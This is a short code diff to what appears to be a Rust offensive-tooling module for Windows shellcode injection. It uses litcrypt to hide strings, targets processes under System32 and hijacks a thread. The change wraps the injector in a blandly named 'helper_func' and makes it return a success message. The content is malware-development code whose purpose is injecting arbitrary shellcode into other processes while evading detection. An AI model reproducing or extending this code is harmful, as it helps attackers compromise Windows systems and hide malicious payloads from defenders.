@@ -9,7 +9,13 @@ mod func;
 extern crate litcrypt;
 use_litcrypt!();
 
-pub fn inject_shellcode(process_name: &str, shellcode: &[u8]) -> Result<(), String> {
+pub fn helper_func(process_name: &str, scode: &[u8]) -> Result<String, String> {
+    let result = inject_shellcode(process_name, scode);
+
+    result
+}
+
+fn inject_shellcode(process_name: &str, shellcode: &[u8]) -> Result<String, String> {
     // Format the process path
     let process_path = if !process_name.contains('\\') {
         format!("C:\\Windows\\System32\\{}", process_name)
@@ -65,5 +71,7 @@ pub fn inject_shellcode(process_name: &str, shellcode: &[u8]) -> Result<(), Stri
         return Err("Failed to hijack thread".to_string());
     }
 
-    Ok(())
+    //Ok(())
+    //if success, return a success message
+    Ok("Shellcode injected successfully".to_string())
 }
